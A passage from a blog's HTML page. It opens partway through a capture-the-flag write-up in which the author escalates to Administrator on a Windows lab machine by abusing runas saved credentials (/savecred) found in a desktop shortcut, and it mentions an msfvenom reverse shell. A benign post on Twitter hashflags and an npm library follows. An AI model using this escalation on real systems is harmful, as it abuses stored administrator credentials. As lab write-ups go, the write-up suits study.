+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Downloads
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Favorites
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Links
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Music
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Pictures
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Saved Games
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Searches
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>39 PM    &lt;DIR&gt;          Videos
+               1 File(s)        964,179 bytes
+              14 Dir(s)  16,745,127,936 bytes free
+
+C:\Users\security&gt;cd Desktop
+
+C:\Users\security\Desktop&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\Desktop
+
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          .
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          ..
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>37 PM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  16,744,726,528 bytes free
+
+C:\Users\security\Desktop&gt;more user.txt
+&lt;SNIP&gt;
+</code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>Now that we&rsquo;ve got the first flag, we need to escalate to <code>root</code> access—or more specifically <code>Administrator</code> on Windows.</p><p>The <code>.yawcam</code> directory looks out of the ordinary.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>dir .yawcam
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\.yawcam
+
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM    &lt;DIR&gt;          .
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM    &lt;DIR&gt;          ..
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          2
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM                 0 banlist.dat
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          extravars
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM    &lt;DIR&gt;          img
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          logs
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM    &lt;DIR&gt;          motion
+08/22/2018  06<span style=color:#960050;background-color:#1e0010>:</span>49 AM                 0 pass.dat
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          stream
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          tmp
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>34 PM                82 ver.dat
+08/23/2018  10<span style=color:#960050;background-color:#1e0010>:</span>52 PM    &lt;DIR&gt;          www
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM             1,411 yawcam_settings.xml
+               4 File(s)          1,493 bytes
+              10 Dir(s)  16,764,841,984 bytes free
+</code></pre></div><p>However poking around in there proved fruitless. Maybe there&rsquo;s a way to use this, but I couldn&rsquo;t figure anything out.</p><p>Let&rsquo;s keep looking</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\security&gt;cd ../
+
+C:\Users&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users
+
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>15 PM    &lt;DIR&gt;          .
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>15 PM    &lt;DIR&gt;          ..
+08/23/2018  11<span style=color:#960050;background-color:#1e0010>:</span>46 PM    &lt;DIR&gt;          Administrator
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>15 PM    &lt;DIR&gt;          engineer
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          Public
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>16 PM    &lt;DIR&gt;          security
+               0 File(s)              0 bytes
+               6 Dir(s)  16,754,778,112 bytes free
+</code></pre></div><p>Maybe one of the other users has something interesting we can use?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users&gt;cd engineer
+Access is denied.
+</code></pre></div><p>I didn&rsquo;t really expect that to work anyway</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users&gt;cd Public
+
+C:\Users\Public&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public
+
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          .
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          ..
+07/14/2009  05<span style=color:#960050;background-color:#1e0010>:</span>06 AM    &lt;DIR&gt;          Documents
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Downloads
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Music
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Pictures
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Videos
+               1 File(s)        964,179 bytes
+               7 Dir(s)  16,723,468,288 bytes free
+</code></pre></div><p>Wait a minute, we&rsquo;re missing some of the standard Windows directories. Let&rsquo;s have a closer look.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>
+C:\Users\Public&gt;dir /A
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public
+
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          .
+02/02/2019  04<span style=color:#960050;background-color:#1e0010>:</span>14 PM    &lt;DIR&gt;          ..
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          Desktop
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM               174 desktop.ini
+07/14/2009  05<span style=color:#960050;background-color:#1e0010>:</span>06 AM    &lt;DIR&gt;          Documents
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Downloads
+07/14/2009  02<span style=color:#960050;background-color:#1e0010>:</span>34 AM    &lt;DIR&gt;          Favorites
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Libraries
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Music
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Pictures
+07/14/2009  04<span style=color:#960050;background-color:#1e0010>:</span>57 AM    &lt;DIR&gt;          Videos
+               2 File(s)        964,353 bytes
+              10 Dir(s)  16,717,438,976 bytes free
+</code></pre></div><p>Desktop has a much more recent modification date than everything else</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public&gt;cd Desktop
+
+C:\Users\Public\Desktop&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public\Desktop
+
+08/22/2018  09<span style=color:#960050;background-color:#1e0010>:</span>18 PM             1,870 ZKAccess3.5 Security System.lnk
+               1 File(s)          1,870 bytes
+               0 Dir(s)  16,711,475,200 bytes free
+</code></pre></div><p>That&rsquo;s because there&rsquo;s a shortcut there.</p><p>Now, I&rsquo;m not sure of the best way to view a <code>.lnk</code> on <code>cmd.exe</code> via <code>telnet</code>, but this is what I came up with. If anyone knows of a better way, please let me know!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public\Desktop&gt;type <span style=color:#e6db74>&#34;ZKAccess3.5 Security System.lnk&#34;</span>
+L<span style=color:#960050;background-color:#1e0010>�</span>F<span style=color:#960050;background-color:#1e0010>�</span>@ <span style=color:#960050;background-color:#1e0010>��</span>7<span style=color:#960050;background-color:#1e0010>���</span>7<span style=color:#960050;background-color:#1e0010>���</span><span style=color:#75715e>#�P/P�O� �:i�+00�/C:\R1M�:Windows��:��M�:*wWindowsV1MV�System32��:��MV�*�System32X2P�:�</span>
+                                                                                                        runas.exe<span style=color:#960050;background-color:#1e0010>��:</span>1<span style=color:#960050;background-color:#1e0010>��:</span>1<span style=color:#960050;background-color:#1e0010>�</span>*Yrunas.exeL-K<span style=color:#960050;background-color:#1e0010>��</span>E<span style=color:#960050;background-color:#1e0010>�</span>C:\Windows\System32\runas.exe<span style=color:#75715e>#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred &#34;C:\ZKTeco\ZKAccess3.5\Access.exe&#34;&#39;C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�</span>
+                      <span style=color:#960050;background-color:#1e0010>�</span>wN<span style=color:#960050;background-color:#1e0010>���</span>]N<span style=color:#960050;background-color:#1e0010>�</span>D.<span style=color:#960050;background-color:#1e0010>��</span>Q<span style=color:#960050;background-color:#1e0010>���</span>`<span style=color:#960050;background-color:#1e0010>�</span>Xaccess<span style=color:#960050;background-color:#1e0010>�</span>_<span style=color:#960050;background-color:#1e0010>���</span>8{E<span style=color:#960050;background-color:#1e0010>�</span>3
+                                                          O<span style=color:#960050;background-color:#1e0010>�</span>j)<span style=color:#960050;background-color:#1e0010>�</span>H<span style=color:#960050;background-color:#1e0010>���</span>
+                                                                   )ΰ[<span style=color:#960050;background-color:#1e0010>�</span>_<span style=color:#960050;background-color:#1e0010>���</span>8{E<span style=color:#960050;background-color:#1e0010>�</span>3
+                                                                                O<span style=color:#960050;background-color:#1e0010>�</span>j)<span style=color:#960050;background-color:#1e0010>�</span>H<span style=color:#960050;background-color:#1e0010>���</span>
+                                                                                         )ΰ[<span style=color:#960050;background-color:#1e0010>�</span>	<span style=color:#960050;background-color:#1e0010>��</span>1SPS<span style=color:#960050;background-color:#1e0010>�</span>XF<span style=color:#960050;background-color:#1e0010>�</span>L8C<span style=color:#960050;background-color:#1e0010>���</span>&amp;<span style=color:#960050;background-color:#1e0010>�</span>m<span style=color:#960050;background-color:#1e0010>�</span>e*S-1-5-21-953262931-566350628-63446256-500
+</code></pre></div><p>It&rsquo;s a bit difficult to read, but it looks like the shortcut runs a program as the <code>Administrator</code> using saved credentials. We can use that.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public\Desktop&gt;runas /user<span style=color:#960050;background-color:#1e0010>:</span>Administrator /savecred <span style=color:#e6db74>&#34;cmd.exe /c more C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\Public\Desktop\output.txt&#34;</span>
+</code></pre></div><p>Did it work?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\Public\Desktop&gt;more output.txt
+&lt;SNIP&gt;
+</code></pre></div><p>Yes! From there we could generate a reverse shell using <code>msfvenom</code> and run that as <code>Administrator</code>, but I&rsquo;ve got the flag so I&rsquo;ll leave it there for now.</p></div><div class=post><h1 class=post-title><a href=/blog/twitter-hashflags/>Twitter Hashflags (<em>Hash-what?</em>)</a></h1><span class=post-date>Mar 28, 2018 &#183; 4 minute read &#183; <a href=/blog/twitter-hashflags/#disqus_thread>Comments</a></span><p>Have you ever tweeted out a hastag, and discovered a small image attached to the side of it? It could be for <a href=https://twitter.com/HashflagArchive/status/972005822388514818>#StPatricksDay</a>, <a href=https://twitter.com/HashflagArchive/status/972170656912723969>#MarchForOurLives</a>, or whatever <a href=https://twitter.com/HashflagArchive/status/960529700442566656>#白白白白白白白白白白</a> is meant to be. These are hashflags.</p><p>A hashflag, sometimes called Twitter emoji, is a small image that appears after a #hashtag for special events. They are not regular emoji, and you can only use them on the Twitter website, or the official Twitter apps. For example:</p><blockquote class=twitter-tweet><p lang=en dir=ltr><a href="https://twitter.com/hashtag/MondayMotivation?src=hash&ref_src=twsrc%5Etfw">#MondayMotivation</a>: <a href="https://twitter.com/hashtag/CNY?src=hash&ref_src=twsrc%5Etfw">#CNY</a> celebrations are like a marathon not a sprint. Keep up the festive momentum and celebrate with the <a href="https://twitter.com/hashtag/CNY?src=hash&ref_src=twsrc%5Etfw">#CNY</a> emoji using the below hashtags from now until Mar 2nd. <a href="https://twitter.com/hashtag/YearOfTheDog?src=hash&ref_src=twsrc%5Etfw">#YearOfTheDog</a> <a href="https://twitter.com/hashtag/LunarNewYear?src=hash&ref_src=twsrc%5Etfw">#LunarNewYear</a> <a href="https://twitter.com/hashtag/GongXiFaCai?src=hash&ref_src=twsrc%5Etfw">#GongXiFaCai</a> <a href="https://twitter.com/hashtag/%E7%8B%97%E5%B9%B4%E6%97%BA%E6%97%BA?src=hash&ref_src=twsrc%5Etfw">#狗年旺旺</a><a href="https://twitter.com/hashtag/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90?src=hash&ref_src=twsrc%5Etfw">#新年快乐</a><a href="https://twitter.com/hashtag/%E6%81%AD%E5%96%9C%E5%8F%91%E8%B4%A2?src=hash&ref_src=twsrc%5Etfw">#恭喜发财</a><br><br>Happy Monday! <a href=https://t.co/DHAfxnEcSo>pic.twitter.com/DHAfxnEcSo</a></p>&mdash; Twitter Singapore (@TwitterSG) <a href="https://twitter.com/TwitterSG/status/965399443733278720?ref_src=twsrc%5Etfw">February 19, 2018</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>If you&rsquo;re a company, and <a href=http://www.adweek.com/digital/twitters-branded-emojis-come-million-dollar-commitment-169327/>you have enough money</a>, you can buy your own hashflag as well! That&rsquo;s exactly what Disney did for the release of Star Wars: The Last Jedi.</p><blockquote class=twitter-tweet><p lang=en dir=ltr>New hashtag emojis released by <a href="https://twitter.com/Twitter?ref_src=twsrc%5Etfw">@Twitter</a> and <a href="https://twitter.com/starwars?ref_src=twsrc%5Etfw">@StarWars</a> ahead of <a href="https://twitter.com/hashtag/TheLastJedi?src=hash&ref_src=twsrc%5Etfw">#TheLastJedi</a>! <a href="https://twitter.com/hashtag/BB8?src=hash&ref_src=twsrc%5Etfw">#BB8</a> <a href="https://twitter.com/hashtag/BB9E?src=hash&ref_src=twsrc%5Etfw">#BB9E</a> <a href="https://twitter.com/hashtag/Porg?src=hash&ref_src=twsrc%5Etfw">#Porg</a> <a href=https://t.co/nnRJf43o0V>pic.twitter.com/nnRJf43o0V</a></p>&mdash; Good Morning America (@GMA) <a href="https://twitter.com/GMA/status/935573161051152385?ref_src=twsrc%5Etfw">November 28, 2017</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>If you spend the money to buy a hashflag, it&rsquo;s important that you launch it correctly—otherwise they can flop. <a href=https://twitter.com/HashflagArchive/status/960529700442566656>#白白白白白白白白白白</a> is an example of what not to do. At time of writing, it has only 10 uses.</p><p>Hashflags aren&rsquo;t exclusive to English, and they can help add context to a tweet in another language. I don&rsquo;t speak any Russian, but I do know that this image is of BB-8!</p><blockquote class=twitter-tweet><p lang=und dir=ltr><a href="https://twitter.com/hashtag/%D0%B7%D0%B2%D1%91%D0%B7%D0%B4%D0%BD%D1%8B%D0%B5%D0%B2%D0%BE%D0%B9%D0%BD%D1%8B%D1%8D%D0%BF%D0%B8%D0%B7%D0%BE%D0%B48?src=hash&ref_src=twsrc%5Etfw">#звёздныевойныэпизод8</a> <a href=https://t.co/qZsjHFR4jk>pic.twitter.com/qZsjHFR4jk</a></p>&mdash; Hashflags (@HashflagArchive) <a href="https://twitter.com/HashflagArchive/status/956184319206273024?ref_src=twsrc%5Etfw">January 24, 2018</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>Unfortunately hashflags are temporary, so any context they add to a tweet can sometimes be lost at a later date. Currently Twitter doesn&rsquo;t provide an official API for hashflags, and there is no canonical list of currently active hashflags. <a href=https://twitter.com/hashflaglist>@hashflaglist</a> tracks hashflags, but it&rsquo;s easy to miss one—this is where Azure Functions come in.</p><p>It turns out that on <a href=https://twitter.com>Twitter.com</a> the list of currently active hashflags is sent as a JSON object in the HTML as initial data. All I need to do is fetch Twitter.com, and extract the JSON object from the HTML.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl https://twitter.com -v --silent 2&gt;&amp;<span style=color:#ae81ff>1</span> | grep -o -P <span style=color:#e6db74>&#39;.{6}activeHashflags.{6}&#39;</span>
+
+&amp;quot;activeHashflags&amp;quot;
+</code></pre></div><p>I wrote <a href=https://github.com/JamieMagee/hashflags-function/blob/master/hashflags/ActiveHashflags.cs>some C#</a> to parse and extract the <code>activeHashflags</code> JSON object, and store it in an Azure blob. You can find it <a href=https://hashflags.blob.core.windows.net/json/activeHashflags>here</a>. Using Azure Functions I can run this code on a timer, so the Azure blob is always up to date with the latest Twitter hashflags. This means the blob can be used as an unofficial Twitter hashflags API—but I didn&rsquo;t want to stop there.</p><p>I wanted to solve some of the issues with hashflags around both discovery and durability. Azure Functions is the perfect platform for these small, single purpose pieces of code. I ended up writing five Azure Functions in total—all of which can be found <a href=https://github.com/JamieMagee/hashflags-function>on GitHub</a>.</p><p><a href=https://github.com/JamieMagee/hashflags-function><img src=/img/hashflags-function-github.png alt="Screenshot of hashflags-function GitHub page"></a></p><ol><li><code>ActiveHashflags</code> fetches the active hashflags from Twitter, and stores them in a JSON object in an Azure Storage Blob. You can find the list of current hashflags <a href=https://hashflags.blob.core.windows.net/json/activeHashflags>here</a>.</li><li><code>UpdateHashflagState</code> reads the JSON, and updates the hashflag table with the current state of each hashflag.</li><li><code>StoreHashflagImage</code> downloads the hashflag image, and stores it in a blob store.</li><li><code>CreateHeroImage</code> creates a hero image of the hashtag and hashflag.</li><li><code>TweetHashflag</code> tweets the hashtag and hero image.</li></ol><p>Say hello to <a href=https://twitter.com/HashflagArchive>@HashflagArchive</a>!</p><p><a href=https://twitter.com/HashflagArchive><img src=/img/hashflag-archive.png alt="Screenshot of HashflagArchive Twitter stream"></a></p><p>@HashflagArchive solves both the issues I have with hashflags: it tweets out new hashflags the same hour they are activated on twitter, which solves the issue of discovery; and it tweets an image of the hashtag and hashflag, which solves the issue of hashflags being temporary.</p><p>So this is great, but there&rsquo;s still one issue—how to use hashflags outside of Twitter.com and the official Twitter apps. This is where the JSON blob comes in. I can build a wrapper library around that, and then using that library, build applications with Twitter hashflags. So that&rsquo;s exactly what I did.</p><p><a href=https://github.com/JamieMagee/hashflags-node><img src=/img/hashflags-node-github.png alt="Screenshot of hashflags-node GitHub page"></a></p><p>I wrote an npm package called <a href=https://www.npmjs.com/package/hashflags><code>hashflags</code></a>. It&rsquo;s pretty simple to use, and integrates nicely with the official <a href=https://www.npmjs.com/package/twitter-text><code>twitter-text</code></a> npm package.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>Hashflags</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#39;hashflags&#39;</span>;
+
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>hf</span>: <span style=color:#66d9ef>Hashflags</span>;
+<span style=color:#a6e22e>Hashflags</span>.<span style=color:#a6e22e>FETCH</span>().<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>val</span>: <span style=color:#66d9ef>Map</span>&lt;<span style=color:#f92672>string</span><span style=color:#960050;background-color:#1e0010>,</span> <span style=color:#a6e22e>string</span>&gt;) <span style=color:#f92672>=&gt;</span> {
+  <span style=color:#a6e22e>hf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Hashflags</span>(<span style=color:#a6e22e>val</span>);
+  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>hf</span>.<span style=color:#a6e22e>activeHashflags</span>);
+});
+</code></pre></div><p>I wrote it in TypeScript, but it can also be used from plain old JS as well.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>Hashflags</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;hashflags&#39;</span>).<span style=color:#a6e22e>Hashflags</span>;
+
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>hf</span>;
+<span style=color:#a6e22e>Hashflags</span>.<span style=color:#a6e22e>FETCH</span>().<span style=color:#a6e22e>then</span>(<span style=color:#a6e22e>val</span> =&gt; {
+  <span style=color:#a6e22e>hf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Hashflags</span>(<span style=color:#a6e22e>val</span>);
+  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>hf</span>.<span style=color:#a6e22e>activeHashflags</span>);
+});
+</code></pre></div><p>So there you have it, a quick introduction to Twitter hashflags via Azure Functions and an npm library. If you&rsquo;ve got any questions please leave a comment below, or reach out to me on Twitter <a href=https://twitter.com/Jamie_Magee>@Jamie_Magee</a>.</p></div><div class=pagination><a class=pagination-item href=/>Newer</a>
+<a class=pagination-item href=/page/3/>Older</a></div></div></div><script type=text/javascript>var disqus_shortname="jamiemagee";(function(){var a=document.createElement('script');a.async=!0,a.type='text/javascript',a.src='//'+disqus_shortname+'.disqus.com/count.js',(document.getElementsByTagName('HEAD')[0]||document.getElementsByTagName('BODY')[0]).appendChild(a)})()</script><script src=/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad()</script><script src=/js/cms.js></script></body></html>
